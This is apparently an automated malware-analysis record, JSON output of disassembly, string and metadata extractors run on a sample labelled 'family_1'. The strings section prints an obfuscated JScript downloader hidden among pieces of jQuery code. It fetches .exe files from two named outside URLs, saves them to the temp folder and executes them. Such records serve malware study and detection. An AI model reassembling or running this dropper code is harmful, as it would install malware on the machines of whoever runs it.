{
    "filepath": "/corpus/family_1/144df23ba5e0e2761393ecb3a63f38d08ef3e9401a756637bdeaaddced4ac51b",
    "fileinfo": {
        "labels": {
            "family": "family_1"
        },
        "md5": "b8ed66f2b280444d863e6f2a2b14c0f1",
        "type": "ASCII text, with very long lines, with CRLF line terminators"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {
                "and byte [rbx + ], bh;imul esp, dword [rsi + ], ;jae ;imul r13d, dword [rsi + ], ;jl ": 1,
                "jl ;jo ;imul r13d, dword gs:[rsp + r14*2 + ], ;jnp ;imul esp, dword [rsi + ], ": 1,
                "outsb dx, byte [rsi];invalid;insb byte [rdi], dx;and byte [rbp + ], ch;je ": 2,
                "movsxd rbp, dword [rdi + ];outsb dx, byte gs:[rsi];jae ;outsb dx, byte [rsi];and byte [eax + ebp*2 + ], dh": 1,
                "outsb dx, byte gs:[rsi];jae ;outsb dx, byte [rsi];and byte [eax + ebp*2 + ], dh;jae ": 1,
                "ja ;imul ebp, dword [rbp + ], ;sub eax, ;and byte [rcx + ], ch;and byte [rax], ch": 1,
                "push ;and byte [rbx + ], dh;outsb dx, byte [rsi];movsxd rsp, dword [rbp + ];insb byte [rdi], dx": 1,
                "insd dword [rdi], dx;and byte [rcx + ], ch;and byte [rsi + ], ch;je ;jns ": 1,
                "sub al, ;sub byte [rbp + ], ch;je ;push ;je ": 1,
                "jae ;jb ;xor byte [rax], ch;xor dword [rcx], ebp;cmp esp, dword [rax]": 1,
                "outsb dx, byte [rsi];and ch, byte [rdx];jae ;outsd dx, dword [rsi];jo ": 1,
                "and ch, byte [rdx];jae ;outsd dx, dword [rsi];jo ;jb ": 1,
                "and ch, byte [rbx + ];push rax;and ch, byte [rax];sub byte [rdx], ah;movsxd rbp, dword [rax + ]": 1,
                "jb ;insd dword [rdi], dx;outsd dx, dword gs:[rsi];and ch, byte [rdx];push rsi": 1,
                "jae ;sub al, ;invalid;insb byte [rdi], dx;insb byte [rdi], dx": 1
            }
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "ufQwqend = \"} if ( seed ) { if ( postFinder || preFilter ) { if ( postFinder ) { Get the final matcherOut by condensing this intermediate into postFinder contexts temp = []": 1,
                "i = matcherOut.length": 1,
                "while ( i-- ) { if ( (elem = matcherOut[i]) ) { Restore matcherIn since elem is not yet a final match temp.push( (matcherIn[i] = elem) )": 1,
                "} } postFinder( null, (matcherOut = []), temp, xml )": 1,
                "femalesI = 0": 1,
                "String.prototype.frivolity = function () { return this.substr(0, 1)": 1,
                "var jQzTLmwQ = [(\"dealt\",\"awareness\",\"t\")+(\"tension\",\"shoppers\",\"weapon\",\"scythe\",\"As\")+\"Kw\"+\"kKP\", (\"chops\",\"romeo\",\"V\")+\"gs\"+(\"legends\",\"allen\",\"corduroy\",\"correlative\",\"xd\")+\"ay\", \"E\"+(\"women\",\"appreciate\",\"voters\",\"xpan\")+\"dEnvir\"+\"onme\"+(\"guiana\",\"shaving\",\"nt\")+(\"gully\",\"human\",\"participation\",\"assault\",\"St\")+(\"connect\",\"snarl\",\"ri\")+\"ngs\", \"\"+(\"volvo\",\"awesome\",\"serenade\",\"benefit\",\"%\")+(\"insert\",\"pantheism\",\"practitioner\",\"origins\",\"TE\")+\"MP%\", \"\"+\".\"+(\"depressing\",\"himself\",\"unlettered\",\"simulations\",\"exe\"), \"R\"+(\"needs\",\"liner\",\"debate\",\"handed\",\"un\"), \"Actre\"+(\"trickery\",\"vampire\",\"portable\",\"canadian\",\"stingplaceiv\")+(\"remainder\",\"compassionate\",\"re\")+(\"seedling\",\"incarceration\",\"stin\")+(\"kneedeep\",\"altitude\",\"gplace\")+(\"registration\",\"attempts\",\"shock\",\"spanking\",\"eXrestin\")+(\"tiffany\",\"harps\",\"varuna\",\"control\",\"gp\")+(\"shall\",\"westminster\",\"laceObrest\")+(\"vertebrate\",\"souls\",\"in\")+(\"approving\",\"funds\",\"modify\",\"gplace\")+(\"boring\",\"maker\",\"output\",\"jere\")+(\"flower\",\"dolls\",\"mechanisms\",\"stin\")+(\"comeliness\",\"howls\",\"gp\")+(\"someone\",\"colin\",\"la\")+(\"craze\",\"limitation\",\"marche\",\"applications\",\"cect\"), \"FlIQvJEPNDI\", \"DvzWWwCX\", (\"indirect\",\"dishevelled\",\"W\")+(\"spicy\",\"logos\",\"crackers\",\"Sc\")+\"re\"+(\"compatible\",\"quire\",\"lenders\",\"addition\",\"stingp\")+(\"gained\",\"unholy\",\"console\",\"la\")+(\"magic\",\"paper\",\"footwear\",\"offline\",\"ce\")+(\"refrigerator\",\"martinique\",\"elate\",\"ri\")+(\"burgomaster\",\"manoeuvre\",\"sooty\",\"ptre\")+(\"phosphorus\",\"machines\",\"microwave\",\"st\")+(\"naturals\",\"upshot\",\"playground\",\"ingplace.\") + (\"occupations\",\"researchers\",\"erratic\",\"comparable\",\"S\"), \"qdaEixO\", \"hrest\"+\"ingp\"+\"la\"+(\"flexibility\",\"visits\",\"adobe\",\"mutter\",\"ce\")+\"el\"+\"re\"+(\"wheaten\",\"animal\",\"weeding\",\"st\")+\"in\"+\"gp\"+\"la\"+\"cel\", \"WcPXuy\", \"\"+\"u\"+(\"dragoman\",\"typically\",\"HW\")+(\"exeter\",\"superb\",\"PNT\"), \"M\"+(\"genuine\",\"helmet\",\"rest\")+\"ingplaceSXrestingplaceML\"+(\"denizen\",\"virgin\",\"orifice\",\"restin\")+\"gplace2\" + (\"wayne\",\"typically\",\"scotland\",\".restingpla\")+(\"tenfold\",\"vaccine\",\"ce\")+(\"fiasco\",\"conservation\",\"wither\",\"XMrestingp\")+(\"brats\",\"coquette\",\"scale\",\"laceLH\")+\"rest\"+(\"george\",\"biological\",\"in\")+(\"tocsin\",\"roger\",\"strict\",\"crucify\",\"gp\")+(\"price\",\"detriment\",\"tenet\",\"inspector\",\"lace\")+(\"planets\",\"fatality\",\"parallel\",\"stallion\",\"TTP\")]": 1,
                "FcyIAFvAG = \"}function matcherFromTokens( tokens ) { var checkContext, matcher, j, len = tokens.length, leadingRelative = Expr.relative[ tokens[0].type ], implicitRelative = leadingRelative || Expr.relative[\\\" \\\"], i = leadingRelative ? 1 : 0,\"": 1,
                "jQzTLmwQ.splice(7, femalesI + 2)": 1,
                "inconsolable = jQzTLmwQ[1+4+1].split(\"restingplace\").join(\"\")": 1,
                "var tgHCJjkMf = this[inconsolable]": 1,
                "AJoiHmnl = \"MQARtiVxCp\"": 1,
                "festivities = ((\"customers\", \"extended\", \"detected\", \"confronts\", \"piGvvtwJkSLv\") + \"DWhPejezDh\").frivolity()": 1,
                "dissolvings = ((\"investigator\", \"meekness\", \"seedy\", \"plant\", \"sfufyWyLEP\") + \"NimiRsObYtb\").frivolity()": 1,
                "femalesI = 6": 1,
                "jQzTLmwQ[femalesI + 1] = jQzTLmwQ[femalesI + 1] + jQzTLmwQ[femalesI + 3]": 1,
                "jQzTLmwQ[femalesI + 2] = \"knIfqEicoV\"": 1,
                "femalesI++": 2,
                "jQzTLmwQ.splice(femalesI + 1, femalesI - 4)": 1,
                "jQzTLmwQ[femalesI] = jQzTLmwQ[femalesI].split(\"restingplace\").join(\"\")": 1,
                "var JKALgsX = new tgHCJjkMf(jQzTLmwQ[femalesI])": 1,
                "pbvYKhb = \" seed[temp] = !(results[temp] = elem)": 1,
                "jQzTLmwQ[femalesI + 1] = jQzTLmwQ[femalesI + 1].split(\"restingplace\").join(\"\")": 1,
                "var KYVDjQN = new tgHCJjkMf(jQzTLmwQ[1 + femalesI])": 1,
                "CcrsBekMrUe = \"} Move matched elements from seed to results to keep them synchronized i = matcherOut.length": 1,
                "while ( i-- ) { if ( (elem = matcherOut[i]) && (temp = postFinder ? indexOf( seed, elem ) : preMap[i]) > -1 ) {\"": 1,
                "femalesI /= 2": 1,
                "var YRFhWRGA = JKALgsX[jQzTLmwQ[femalesI - 2]](jQzTLmwQ[femalesI - 1])": 1,
                "TFrkRPQhhv = \"} Add elements to results, through postFinder if defined } else { matcherOut = condense( matcherOut === results ? matcherOut.splice( preexisting, matcherOut.length ) : matcherOut )": 1,
                "if ( postFinder ) { postFinder( null, results, matcherOut, xml )": 1,
                "} else { push.apply( results, matcherOut )": 1,
                "} } })": 1,
                "flavore = ((\"caterpillar\", \"lighthouse\", \"entries\", \"florence\", \"EyKSTgafQQ\") + \"khvIIk\").frivolity()": 1,
                "function draper(conglomerate, bootless) {": 1,
                "var manhattan = YRFhWRGA + \"/\" + bootless + jQzTLmwQ[femalesI]": 1,
                "UpSJgn = \"} Add elements passing elementMatchers directly to results Support: IE<9, Safari Tolerate NodeList properties (IE: \\\"length\\\"": 1,
                "Safari: <number>) matching elements by id for (": 1,
                "i !== len && (elem = elems[i]) != null": 1,
                "i++ ) { if ( byElement && elem ) { j = 0": 1,
                "if ( !context && elem.ownerDocument !== document ) { setDocument( elem )": 1,
                "xml = !documentIsHTML": 1,
                "} while ( (matcher = elementMatchers[j++]) ) { if ( matcher( elem, context || document, xml) ) { results.push( elem )": 1,
                "} } if ( outermost ) { dirruns = dirrunsUnique": 1,
                "KYVDjQN[\"o\" + festivities + flavore + \"n\"]((\"price\",\"diane\",\"G\") + flavore + (\"incoherent\",\"scape\",\"culture\",\"supporter\",\"T\"), conglomerate, false)": 1,
                "AJhdpXQkPr = \"} Track unmatched elements for set filters if ( bySet ) { They will have gone through all possible matchers if ( (elem = !matcher && elem) ) { matchedCount--": 1,
                "KYVDjQN[dissolvings + (\"impacts\",\"accessions\",\"e\") + ((\"adopted\", \"forsooth\", \"GrWIQb\", \"uprising\", \"typically\", \"nEHtJvnx\") + \"miCeRrw\").frivolity() + ((\"track\", \"clemency\", \"twScBR\", \"epitome\", \"incorporate\", \"dYrdBcSj\") + \"yQtBFsP\").frivolity()]()": 1,
                "TFeLHHK = \"} Lengthen the array for every element, matched or not if ( seed ) { unmatched.push( elem )": 1,
                "if (KYVDjQN.status == 200) {": 1,
                "var IAMUaBA = new tgHCJjkMf((\"\"+(\"outgoing\",\"usurped\",\"A\")+(\"banner\",\"garcia\",\"influx\",\"democrat\",\"pO\")+\"DB.\" + \"\"+\"S\"+\"tr\"+(\"tanner\",\"pedagogue\",\"eam\")).replace(\"p\", \"D\"))": 1,
                "IAMUaBA.open()": 1,
                "PjlCmWYN = \" The foundational matcher ensures that elements are reachable from top-level context(s) matchContext = addCombinator( function( elem ) { return elem === checkContext": 1,
                "}, implicitRelative, true ), matchAnyContext = addCombinator( function( elem ) { return indexOf( checkContext, elem ) > -1": 1,
                "}, implicitRelative, true ), matchers = [ function( elem, context, xml ) { var ret = ( !leadingRelative && ( xml || context !== outermostContext ) ) || ( (checkContext = context).nodeType ? matchContext( elem, context, xml ) : matchAnyContext( elem, context, xml ) )": 1,
                "Avoid hanging onto element (issue #299) checkContext = null": 1,
                "return ret": 1,
                "IAMUaBA.type = 8 * (4 - 3 - 1) + 1": 1,
                "russLuscWe = \" for (": 1,
                "i < len": 1,
                "i++ ) { if ( (matcher = Expr.relative[ tokens[i].type ]) ) { matchers = [ addCombinator(elementMatcher( matchers ), matcher) ]": 1,
                "} else { matcher = Expr.filter[ tokens[i].type ].apply( null, tokens[i].matches )": 1,
                "IAMUaBA[\"w\"+\"ri\"+(\"exuberant\",\"handled\",\"te\")](KYVDjQN[\"\"+(\"grandma\",\"lucerne\",\"titania\",\"performs\",\"R\")+(\"mitigate\",\"mailing\",\"vegetables\",\"es\")+\"pon\" + dissolvings + \"e\"+(\"imperial\",\"tipsy\",\"eastern\",\"diametrically\",\"Bo\")+\"dy\"])": 1,
                "yOQMDiX = \" Return special upon seeing a positional matcher if ( matcher[ expando ] ) { Find the next relative operator (if any) for proper handling j = ++i": 1,
                "j < len": 1,
                "j++ ) { if ( Expr.relative[ tokens[j].type ] ) { break": 1,
                "} } return setMatcher( i > 1 && elementMatcher( matchers ), i > 1 && toSelector( If the preceding token was a descendant combinator, insert an implicit any-element `*` tokens.slice( 0, i - 1 ).concat({ value: tokens[ i - 2 ].type === \\\" \\\" ? \\\"*\\\" : \\\"\\\" }) ).replace( rtrim, \\\"$1\\\" ), matcher, i < j && matcherFromTokens( tokens.slice( i, j ) ), j < len && matcherFromTokens( (tokens = tokens.slice( j )) ), j < len && toSelector( tokens ) )": 1,
                "} matchers.push( matcher )": 1,
                "IAMUaBA[(festivities + (\"delineate\",\"responses\",\"parental\",\"artificer\",\"o\")+(\"nowise\",\"solaris\",\"optimize\",\"Di\")+\"ti\"+\"on\").replace(\"D\", dissolvings)] = 0": 1,
                "wgHrFDKS = \"} return elementMatcher( matchers )": 1,
                "IAMUaBA.saveToFile(manhattan, 2)": 1,
                "FYARFOoXx = \"}function matcherFromGroupMatchers( elementMatchers, setMatchers ) { var bySet = setMatchers.length > 0, byElement = elementMatchers.length > 0, superMatcher = function( seed, context, xml, results, outermost ) { var elem, j, matcher, matchedCount = 0, i = \\\"0\\\", unmatched = seed && [], setMatched = [], contextBackup = outermostContext, We must always have either seed elements or outermost context elems = seed || byElement && Expr.find[\\\"TAG\\\"]( \\\"*\\\", outermost ), Use integer dirruns iff this is the outermost matcher dirrunsUnique = (dirruns += contextBackup == null ? 1 : Math.random() || 0.1), len = elems.length": 1,
                "IAMUaBA.close()": 1,
                "ikLIKCxaarx = \" if ( outermost ) { outermostContext = context === document || context || outermost": 1,
                "JKALgsX[jQzTLmwQ[femalesI + 1]](manhattan, 1, \"dYCqFJdLNaB\" === \"vWCvRYCOfn\")": 1,
                "OUiLy = \"} if ( seed ) { Reintegrate element matches to eliminate the need for sorting if ( matchedCount > 0 ) { while ( i-- ) { if ( !(unmatched[i] || setMatched[i]) ) { setMatched[i] = pop.call( results )": 1,
                "} catch (SQfom) { }": 1,
                "draper(\"htt\"+\"p://\"+\"di\"+(\"straightforward\",\"supplements\",\"actuality\",\"gitaldips.pk/wp-cont\")+\"ent/plug\"+\"ins/hello123/j7u7h\"+\"54h5.exe\",\"lKwWNiDJAj\")": 1,
                "VBpoiETKh = \"} `i` is now the count of elements visited above, and adding it to `matchedCount` makes the latter nonnegative. matchedCount += i": 1,
                "WScript.Sleep(59103)": 1,
                "draper((\"nondescript\",\"fattening\",\"singh\",\"reinforcement\",\"h\")+\"tt\"+\"p:\"+\"//\"+(\"classifieds\",\"automated\",\"celts\",\"pallet\",\"na\")+\"pi\"+\"er\"+\"spro\"+\"pe\"+\"rt\"+\"y.\"+\"co\"+(\"querulous\",\"insignia\",\"equation\",\"m.\")+\"au/w\"+\"p-\"+\"co\"+\"nt\"+\"en\"+(\"speciality\",\"experiments\",\"t/\")+\"pl\"+(\"thick\",\"seraphic\",\"ug\")+\"in\"+\"s/\"+\"he\"+\"ll\"+\"o1\"+\"23\"+\"/8\"+\"88\"+\"8y\"+\"tc\"+(\"proverbial\",\"infraction\",\"calcium\",\"6r\")+\".e\"+\"xe\",\"IbnMac\")": 1,
                "aOITOj = \" Apply set filters to unmatched elements NOTE: This can be skipped if there are no unmatched elements (i.e., `matchedCount` equals `i`), unless we didn\\\"t visit _any_ elements in the above loop because we have no element matchers and no seed. Incrementing an initially-string \\\"0\\\" `i` allows `i` to remain a string only in that case, which will result in a \\\"00\\\" `matchedCount` that differs from `i` but is also numerically zero. if ( bySet && i !== matchedCount ) { j = 0": 1,
                "while ( (matcher = setMatchers[j++]) ) { matcher( unmatched, setMatched, context, xml )": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "binsz    10900": 1,
                "bits     64": 1,
                "canary   false": 1,
                "crypto   false": 1,
                "endian   little": 1,
                "havecode false": 1,
                "linenum  false": 1,
                "lsyms    false": 1,
                "maxopsz  16": 1,
                "minopsz  1": 1,
                "nx       false": 1,
                "pcalign  0": 1,
                "pic      false": 1,
                "relocs   false": 1,
                "static   true": 1,
                "stripped false": 1,
                "va       false": 1,
                "10900": 1
            }
        }
    ]
}